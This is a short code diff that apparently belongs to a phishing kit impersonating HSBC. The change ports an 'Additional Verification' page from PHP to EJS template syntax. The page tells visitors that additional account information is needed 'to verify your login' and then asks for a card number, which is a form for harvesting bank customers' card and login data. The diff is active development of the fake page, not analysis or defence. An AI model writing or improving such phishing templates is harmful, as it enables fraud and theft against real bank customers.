@@ -46,10 +46,10 @@ let p_expiry = hsbc.exp === 'on' ? true : false;
         <div class="main">
             <div class="alignment div-main">
                 <p class="pageTitle" style="padding-bottom: 0px">Additional Verification</p>
-                <form id="loginForm" method='POST' autocomplete="off" class="lab-form" <?=$p_card ? 'onsubmit="return validate()"' : ''?>>
+                <form id="loginForm" method='POST' autocomplete="off" class="lab-form">
                     <input type="hidden" id="userAgent" name="userAgent">
                     <p style="margin-bottom: 20px; margin-top: 20px;">To verify your login, we require some additional information regarding your account.</p>
-                    <% } if (p_card) { %>
+                    <%  if (p_card) { %>
                         <div class="row" style="align-items: center;">
                             <p class="formLabel">Card Number</p>
                         </div>
